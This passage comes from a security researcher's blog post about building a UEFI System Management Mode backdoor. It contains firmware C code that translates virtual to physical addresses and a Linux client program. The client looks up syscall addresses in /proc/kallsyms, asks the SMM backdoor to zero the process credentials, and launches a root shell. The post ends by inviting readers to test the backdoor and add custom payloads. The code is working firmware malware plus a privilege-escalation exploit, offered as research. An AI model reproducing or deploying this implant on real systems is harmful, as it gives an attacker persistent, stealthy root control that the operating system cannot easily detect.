<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> PDE_INDEX</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;"> 21</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">&amp;</span><span style="color: #7f0055;"> 0x1ff</span><span style="color: #7f0055;">)</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> PTE_INDEX</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;">&gt;</span><span style="color: #7f0055;"> 12</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">&amp;</span><span style="color: #7f0055;"> 0x1ff</span><span style="color: #7f0055;">)</span>

<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> PAGE_OFFSET_4K</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">&amp;</span><span style="color: #7f0055;"> 0xfff</span><span style="color: #7f0055;">)</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> PAGE_OFFSET_2M</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> </span><span style="color: #7f0055;">&amp;</span><span style="color: #7f0055;"> 0x1fffff</span><span style="color: #7f0055;">)</span>

<span style="color: #3f7f59;">// PS flag of PDPTE and PDE</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> PDPTE_PDE_PS 0x80</span>

<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> INTERLOCKED_GET</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;"> InterlockedCompareExchange64</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">UINT64 </span><span style="color: #7f0055;">*</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">(</span><span style="color: #7f0055;">_addr_</span><span style="color: #7f0055;">)</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> 0</span><span style="color: #7f0055;">,</span><span style="color: #7f0055;"> 0</span><span style="color: #7f0055;">)</span>

<span style="color: #7f0055; font-weight: bold;">BOOLEAN</span> Check_IA_32e(PCONTROL_REGS ControlRegs)
{
    UINT64 Efer = __readmsr(IA32_EFER);

    <span style="color: #3f7f59;">/*</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Check that supported IA-32 long mode memory translation mechanisms </span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;was enabled when SMI occurs.</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;*/</span>
    <span style="color: #7f0055; font-weight: bold;">if</span> (!(ControlRegs-&gt;Cr0 &amp; CR0_PG))
    {
        DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: CR0.PG is not set</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);
        <span style="color: #7f0055; font-weight: bold;">return</span> FALSE;   
    }

    <span style="color: #7f0055; font-weight: bold;">if</span> (!(ControlRegs-&gt;Cr4 &amp; CR4_PAE))
    {
        DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: CR4.PAE is not set</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);
        <span style="color: #7f0055; font-weight: bold;">return</span> FALSE;   
    }

    <span style="color: #7f0055; font-weight: bold;">if</span> (!(Efer &amp; IA32_EFER_LME))
    {
        DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: IA32_EFER.LME is not set</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);
        <span style="color: #7f0055; font-weight: bold;">return</span> FALSE;
    }

    <span style="color: #7f0055; font-weight: bold;">return</span> TRUE;
}
<span style="color: #3f7f59;">//--------------------------------------------------------------------------------------</span>
EFI_STATUS VirtualToPhysical(UINT64 Addr, UINT64 *Ret, UINT64 Cr3)
{
    UINT64 PhysAddr = 0;
    EFI_STATUS Status = EFI_INVALID_PARAMETER;    

    X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PML4Entry;    

    DbgMsg(__FILE__, __LINE__, __FUNCTION__<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">(): CR3 is 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">, VA is 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Cr3, Addr);

    <span style="color: #3f7f59;">// get PML4 table entry of given virtual address</span>
    PML4Entry.Uint64 = INTERLOCKED_GET(PML4_ADDRESS(Cr3) + PML4_INDEX(Addr) * <span style="color: #7f0055; font-weight: bold;">sizeof</span>(UINT64));

    DbgMsgMem(
        __FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">PML4E is at 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">[0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">]: 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, 
        PML4_ADDRESS(Cr3), PML4_INDEX(Addr), PML4Entry.Uint64
    );

    <span style="color: #3f7f59;">// check that entry is present</span>
    <span style="color: #7f0055; font-weight: bold;">if</span> (PML4Entry.Bits.Present)
    {
        X64_PAGE_MAP_AND_DIRECTORY_POINTER_2MB_4K PDPTEntry;

        <span style="color: #3f7f59;">// get PDPTE of given virtual address</span>
        PDPTEntry.Uint64 = INTERLOCKED_GET(PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress) + 
                                           PDPT_INDEX(Addr) * <span style="color: #7f0055; font-weight: bold;">sizeof</span>(UINT64));

        DbgMsg(
            __FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">PDPTE is at 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">[0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">]: 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, 
            PFN_TO_PAGE(PML4Entry.Bits.PageTableBaseAddress),
            PDPT_INDEX(Addr), PDPTEntry.Uint64
        );
 
        <span style="color: #3f7f59;">// check that entry is present</span>
        <span style="color: #7f0055; font-weight: bold;">if</span> (PDPTEntry.Bits.Present)
        {
            <span style="color: #3f7f59;">// check for page size flag</span>
            <span style="color: #7f0055; font-weight: bold;">if</span> ((PDPTEntry.Uint64 &amp; PDPTE_PDE_PS) == 0)
            {
                X64_PAGE_DIRECTORY_ENTRY_4K PDEntry;

                <span style="color: #3f7f59;">// get PDE of given virtual address for less than 1Gbyte pages</span>
                PDEntry.Uint64 = INTERLOCKED_GET(PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress) +
                                                 PDE_INDEX(Addr) * <span style="color: #7f0055; font-weight: bold;">sizeof</span>(UINT64));

                DbgMsg(
                    __FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">PDE is at 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">[0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">]: 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, 
                    PFN_TO_PAGE(PDPTEntry.Bits.PageTableBaseAddress), PDE_INDEX(Addr), 
                    PDEntry.Uint64
                );

                <span style="color: #3f7f59;">// check that entry is present</span>
                <span style="color: #7f0055; font-weight: bold;">if</span> (PDEntry.Bits.Present)
                {
                    <span style="color: #3f7f59;">// check for page size flag</span>
                    <span style="color: #7f0055; font-weight: bold;">if</span> ((PDEntry.Uint64 &amp; PDPTE_PDE_PS) == 0)
                    {
                        X64_PAGE_TABLE_ENTRY_4K PTEntry;

                        <span style="color: #3f7f59;">// get PDE of given virtual address for 4Kbyte pages</span>
                        PTEntry.Uint64 = INTERLOCKED_GET(PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
                                                         PTE_INDEX(Addr) * <span style="color: #7f0055; font-weight: bold;">sizeof</span>(UINT64));

                        DbgMsg(
                            __FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">PTE is at 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">[0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">]: 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, 
                            PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress), PTE_INDEX(Addr), 
                            PTEntry.Uint64
                        );

                        <span style="color: #3f7f59;">// check that entry is present</span>
                        <span style="color: #7f0055; font-weight: bold;">if</span> (PTEntry.Bits.Present)
                        {
                            <span style="color: #3f7f59;">// get desired physical address</span>
                            PhysAddr = PFN_TO_PAGE(PTEntry.Bits.PageTableBaseAddress) +
                                       PAGE_OFFSET_4K(Addr);

                            Status = EFI_SUCCESS;
                        }
                        <span style="color: #7f0055; font-weight: bold;">else</span>
                        {
                            DbgMsg(
                                __FILE__, __LINE__, 
                                <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: PTE for 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;"> is not present</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Addr
                            );
                        }
                    }
                    <span style="color: #7f0055; font-weight: bold;">else</span>
                    {
                        <span style="color: #3f7f59;">// get desired physical address for 2Mbyte pages</span>
                        PhysAddr = PFN_TO_PAGE(PDEntry.Bits.PageTableBaseAddress) +
                                   PAGE_OFFSET_2M(Addr);

                        Status = EFI_SUCCESS;
                    }
                }
                <span style="color: #7f0055; font-weight: bold;">else</span>
                {
                    DbgMsg(
                        __FILE__, __LINE__, 
                        <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: PDE for 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;"> is not present</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Addr
                    );
                }                     
            }
            <span style="color: #7f0055; font-weight: bold;">else</span>
            {
                DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: 1Gbyte page</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);
            }
        }
        <span style="color: #7f0055; font-weight: bold;">else</span>
        {
            DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: PDPTE for 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;"> is not present</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Addr);
        }
    }
    <span style="color: #7f0055; font-weight: bold;">else</span>
    {
        DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: PML4E for 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;"> is not present</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Addr);
    }

    <span style="color: #7f0055; font-weight: bold;">if</span> (Status == EFI_SUCCESS)
    {
        DbgMsg(__FILE__, __LINE__, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Physical address of 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;"> is 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">\r</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, Addr, PhysAddr);

        <span style="color: #7f0055; font-weight: bold;">if</span> (Ret)
        {            
            <span style="color: #3f7f59;">// return resolved physical address to caller</span>
            *Ret = PhysAddr;
        }
    }

    <span style="color: #7f0055; font-weight: bold;">return</span> Status;
}
</pre>
<br>
Here’s the updated client code that gets required syscall function addresses from <span style="font-family: Courier New, Courier, monospace;">/proc/kallsyms</span> pseudo-file and calls the backdoor with privileges escalation command number as argument using <span style="font-family: Courier New, Courier, monospace;">smm_call()</span>:<br>
<pre style="height: 500px; overflow-x: auto; overflow-y: auto; white-space: pre; word-wrap: normal;"><span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> _GNU_SOURCE</span>

<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">stdio.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">stdlib.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">sched.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">errno.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">string.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">inttypes.h</span><span style="color: #2a00ff;">&gt;</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">include </span><span style="color: #2a00ff;">&lt;</span><span style="color: #3f3fbf;">unistd.h</span><span style="color: #2a00ff;">&gt;</span>

<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> MAX_COMMAND_LEN 0x200</span>

<span style="color: #3f7f59;">// backdoor command number</span>
<span style="color: #7f0055;">#</span><span style="color: #7f0055;">define</span><span style="color: #7f0055;"> BACKDOOR_PRIVESC 8 </span>

<span style="color: #3f7f59;">// external function implemented in assembly</span>
<span style="color: #7f0055; font-weight: bold;">extern</span> <span style="color: #7f0055; font-weight: bold;">int</span> smm_call(<span style="color: #7f0055; font-weight: bold;">long</span> code, <span style="color: #7f0055; font-weight: bold;">unsigned</span> <span style="color: #7f0055; font-weight: bold;">long</span> <span style="color: #7f0055; font-weight: bold;">long</span> arg1, <span style="color: #7f0055; font-weight: bold;">unsigned</span> <span style="color: #7f0055; font-weight: bold;">long</span> <span style="color: #7f0055; font-weight: bold;">long</span> arg2);

<span style="color: #7f0055; font-weight: bold;">int</span> <span style="color: #7f0055; font-weight: bold;">main</span>(<span style="color: #7f0055; font-weight: bold;">int</span> argc, <span style="color: #7f0055; font-weight: bold;">char</span> *argv[])
{
    <span style="color: #7f0055; font-weight: bold;">int</span> ret = 0;    
    cpu_set_t mask;

    CPU_ZERO(&amp;mask);
    CPU_SET(0, &amp;mask);

    ret = sched_setaffinity(0, <span style="color: #7f0055; font-weight: bold;">sizeof</span>(mask), &amp;mask);
    <span style="color: #7f0055; font-weight: bold;">if</span> (ret != 0)
    {
        <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">sched_setaffinity() ERROR </span><span style="color: #2a00ff;">%d</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, errno);
        <span style="color: #7f0055; font-weight: bold;">return</span> errno; 
    }

    <span style="color: #7f0055; font-weight: bold;">if</span> (argc &gt;= 2 &amp;&amp; !<span style="color: #7f0055; font-weight: bold;">strcmp</span>(argv[1], <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">--privesc</span><span style="color: #2a00ff;">"</span>))
    {
        <span style="color: #7f0055; font-weight: bold;">if</span> (argc &gt;= 3)
        {
            <span style="color: #7f0055; font-weight: bold;">int</span> i = 0;            

            <span style="color: #7f0055; font-weight: bold;">for</span> (i = 2; i &lt; argc; i += 2)
            {
                <span style="color: #7f0055; font-weight: bold;">unsigned</span> <span style="color: #7f0055; font-weight: bold;">long</span> <span style="color: #7f0055; font-weight: bold;">long</span> addr = 0;
                <span style="color: #7f0055; font-weight: bold;">char</span> *func = argv[i + 1];
 
                <span style="color: #3f7f59;">// parse syscall address that was passed to the program by itself using cat + grep</span>
                <span style="color: #7f0055; font-weight: bold;">if</span> ((addr = <span style="color: #7f0055; font-weight: bold;">strtoull</span>(argv[i], <span style="color: #7f0055; font-weight: bold;">NULL</span>, 16)) == 0 &amp;&amp; errno == <span style="color: #7f0055; font-weight: bold;">EINVAL</span>)
                {
                    <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">strtoull() ERROR </span><span style="color: #2a00ff;">%d</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, errno);
                    <span style="color: #7f0055; font-weight: bold;">return</span> errno; 
                }

                <span style="color: #7f0055; font-weight: bold;">if</span> (addr == 0)
                {
                    <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: Unable to resolve </span><span style="color: #2a00ff;">%s</span><span style="color: #2a00ff;">() address</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, func);
                    <span style="color: #7f0055; font-weight: bold;">return</span> <span style="color: #7f0055; font-weight: bold;">EINVAL</span>;
                }

                <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">%s</span><span style="color: #2a00ff;">() address is 0x</span><span style="color: #2a00ff;">%llx</span><span style="color: #2a00ff;">...</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, func, addr);            

                <span style="color: #3f7f59;">// call target syscalls code to be sure that it's not swapped out by kernel</span>
                getuid();
                getgid();
                geteuid();            
                getegid();

                <span style="color: #3f7f59;">// ask the backdoor to set cred field value to 0</span>
                ret = smm_call(BACKDOOR_PRIVESC, addr, 0);

                <span style="color: #7f0055; font-weight: bold;">if</span> (ret != 0)
                {
                    <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: Backdoor returns 0x</span><span style="color: #2a00ff;">%x</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, ret);
                    <span style="color: #7f0055; font-weight: bold;">return</span> ret;
                }
            }            

            <span style="color: #3f7f59;">// check for root privileges</span>
            <span style="color: #7f0055; font-weight: bold;">if</span> (getuid() == 0 &amp;&amp; geteuid() == 0 &amp;&amp;
                getgid() == 0 &amp;&amp; getegid() == 0)
            {
                <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">SUCCESS</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);
 
                <span style="color: #3f7f59;">// run command shell</span>
                execl(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">/bin/sh</span><span style="color: #2a00ff;">"</span>, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">sh</span><span style="color: #2a00ff;">"</span>, <span style="color: #7f0055; font-weight: bold;">NULL</span>);
            } 
            <span style="color: #7f0055; font-weight: bold;">else</span>
            {
                <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">FAILS</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);
                <span style="color: #7f0055; font-weight: bold;">return</span> <span style="color: #7f0055; font-weight: bold;">EINVAL</span>;
            }
        }
        <span style="color: #7f0055; font-weight: bold;">else</span>
        {            
            <span style="color: #7f0055; font-weight: bold;">int</span> i = 0, code = 0;
            <span style="color: #7f0055; font-weight: bold;">char</span> command[MAX_COMMAND_LEN];

            <span style="color: #3f7f59;">/* </span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Find
 desired syscalls addresses in /proc/kallsyms and pass them </span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;to
 the same program via command line arguments.</span>
<span style="color: #3f7f59;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</span>

            <span style="color: #7f0055; font-weight: bold;">char</span> *functions[] = { <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">sys_getuid</span><span style="color: #2a00ff;">"</span>, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">sys_geteuid</span><span style="color: #2a00ff;">"</span>, 
                                  <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">sys_getgid</span><span style="color: #2a00ff;">"</span>, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">sys_getegid</span><span style="color: #2a00ff;">"</span>, <span style="color: #7f0055; font-weight: bold;">NULL</span> };                                              

            <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">Getting root...</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>);

            <span style="color: #7f0055; font-weight: bold;">sprintf</span>(command, <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">%s</span><span style="color: #2a00ff;"> --privesc </span><span style="color: #2a00ff;">"</span>, argv[0]);

            <span style="color: #7f0055; font-weight: bold;">for</span> (i = 0; functions[i]; i++)
            {
                <span style="color: #7f0055; font-weight: bold;">char</span> *func = functions[i];            

                <span style="color: #7f0055; font-weight: bold;">sprintf</span>(
                    command + <span style="color: #7f0055; font-weight: bold;">strlen</span>(command), 
                    <span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">0x`cat /proc/kallsyms | grep '</span><span style="color: #2a00ff;">%s</span><span style="color: #2a00ff;">$' | awk '{print $1}'` </span><span style="color: #2a00ff;">%s</span><span style="color: #2a00ff;"> </span><span style="color: #2a00ff;">"</span>, func, func
                );                
            }    
            
            code = <span style="color: #7f0055; font-weight: bold;">system</span>(command);
            <span style="color: #7f0055; font-weight: bold;">if</span> (code != 0)
            {
                <span style="color: #7f0055; font-weight: bold;">printf</span>(<span style="color: #2a00ff;">"</span><span style="color: #2a00ff;">ERROR: Command </span><span style="color: #2a00ff;">\"</span><span style="color: #2a00ff;">%s</span><span style="color: #2a00ff;">\"</span><span style="color: #2a00ff;"> returns 0x</span><span style="color: #2a00ff;">%x</span><span style="color: #2a00ff;">\n</span><span style="color: #2a00ff;">"</span>, command, code);
                <span style="color: #7f0055; font-weight: bold;">return</span> code;
            }       
        }
    }
    <span style="color: #7f0055; font-weight: bold;">else</span>
    {
        <span style="color: #3f7f59;">// ... skipped ...</span>
    }

    <span style="color: #7f0055; font-weight: bold;">return</span> ret;
}
</pre>
<br>
Now, when we compiles this backdoor client and runs the binary with <span style="font-family: Courier New, Courier, monospace;">--privesc</span>
 argument — it gives us the root shell. Example of privileges escalation
 usage on Debian Wheezy with 3.2.60 kernel (on top console window you 
can see SMI dispatch debug messages that was received from backdoor via 
COM port):<br>
<br>
<div class="separator" style="clear: both; text-align: center;">
<a href="https://dl.dropboxusercontent.com/u/22903093/blog/uefi-smm-backdoor/privesc.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/privesc.png" style="border: 0px;" height="443" width="635"></a></div>
<br>
<br>
<h3>
Conclusion</h3>
<br>
It's hard to detect such nice SMM backdoor form running operating 
system,&nbsp;SMRAM is&nbsp;not accessible and everything that it's 
possible to do in easy way — check the hardware configuration for 
suspicious SPI sources&nbsp;enabled&nbsp;that normally not used by 
firmware (like APIC timers, etc.). However, it's a good theme for 
another tool and another post.<br>
<br>
Is there any chances to meet any SMM malware in real world? Well, they're greater that zero, for example, leaked NSA documents <a href="https://www.schneier.com/blog/archives/2014/01/souffletrough_n.html">mentions the SOUFFLETROUGH project</a> — BIOS implant for Juniper firewalls that uses advantages of SMM to hide it's code from OS.<br>
<br>
As for the my SMM backdoor improvements — it's definitely interesting to
 implement a network traffic interception and injection. I believe, that
 it will be not very hard to achieve this with the hooking of NIC driver
 execution flow using I/O instruction restart CPU feature — I'm planning
 to dig into this direction in some future.<br>
<br>
End of the story. Download the source code, test backdoor on your own 
hardware, add some custom payloads, have fun and tell people about your 
findings :)<br>
<br>
<div style="clear: both;"></div>
</div>
<div class="post-footer">
<div class="post-footer-line post-footer-line-1"><span class="post-author vcard">
Posted by
<span class="fn">Сr4sh</span>
</span>
<span class="post-timestamp">
</span>
<span class="post-comment-link">
</span>
<span class="post-icons">
<span class="item-control blog-admin pid-397669949">
<a href="http://www.blogger.com/post-edit.g?blogID=1259663162418910941&amp;postID=1711940776197401016&amp;from=pencil" title="Edit Post">
<img alt="" class="icon-action" src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/icon18_edit_allbkg.gif" height="18" width="18">
</a>
</span>
</span>
<div class="post-share-buttons">
</div>
</div>
<div class="post-footer-line post-footer-line-2"><span class="post-labels">
Labels:
<a href="http://blog.cr4.sh/search/label/english" rel="tag">english</a>,
<a href="http://blog.cr4.sh/search/label/UEFI" rel="tag">UEFI</a>,
<a href="http://blog.cr4.sh/search/label/%D0%B1%D0%B5%D0%B7%D0%BE%D0%BF%D0%B0%D1%81%D0%BD%D0%BE%D1%81%D1%82%D1%8C" rel="tag">безопасность</a>,
<a href="http://blog.cr4.sh/search/label/%D1%80%D0%B5%D0%B2%D0%B5%D1%80%D1%81%D0%B8%D0%BD%D0%B3" rel="tag">реверсинг</a>,
<a href="http://blog.cr4.sh/search/label/%D1%80%D0%B5%D0%BB%D0%B8%D0%B7%D1%8B" rel="tag">релизы</a>,
<a href="http://blog.cr4.sh/search/label/%D1%80%D1%83%D1%82%D0%BA%D0%B8%D1%82%D1%8B" rel="tag">руткиты</a>
</span>
</div>
<div class="post-footer-line post-footer-line-3"><span class="post-location">
</span>
</div>
</div>
</div>
<div class="comments" id="comments">
<a name="comments"></a>
<h4>No comments:</h4>
<div id="Blog1_comments-block-wrapper">
<dl class="avatar-comment-indent" id="comments-block">
</dl>
</div>
<p class="comment-footer">
</p><div class="comment-form">
<a name="comment-form"></a>
<h4 id="comment-post-message">Post a Comment</h4>
<p>
</p>
<a href="https://www.blogger.com/comment-iframe.g?blogID=1259663162418910941&amp;postID=1711940776197401016&amp;blogspotRpcToken=3446894" id="comment-editor-src"></a>
<iframe allowtransparency="true" class="blogger-iframe-colorize blogger-comment-from-post" id="comment-editor" name="comment-editor" src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/comment-iframe.html" frameborder="0" height="269px" width="100%"></iframe>
<script type="text/javascript" src="My%20aimful%20life:%20Building%20reliable%20SMM%20backdoor%20for%20UEFI%20based%20platforms_files/3996186021-comment_from_post_iframe.js"></script>
<script type="text/javascript">
      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html');
    </script>
</div>
<p></p>
<div id="backlinks-container">
<div id="Blog1_backlinks-container">
</div>
</div>
</div>
</div>

        </div></div>
      
<!-- google_ad_section_end -->
</div>
<div class="blog-pager" id="blog-pager">
<span id="blog-pager-older-link">
<a class="blog-pager-older-link" href="http://blog.cr4.sh/2015/03/automated-algebraic-cryptanalysis-with.html" id="Blog1_blog-pager-older-link" title="Older Post">Older Post</a>
</span>
